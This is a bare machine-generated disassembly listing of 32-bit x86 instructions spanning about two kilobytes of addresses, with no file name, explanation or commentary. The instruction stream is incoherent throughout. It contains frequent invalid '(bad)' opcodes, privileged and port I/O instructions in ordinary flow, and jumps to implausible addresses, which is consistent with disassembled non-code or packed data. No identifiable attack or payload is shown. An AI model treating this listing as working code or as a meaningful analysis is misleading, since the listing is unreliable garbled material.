  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
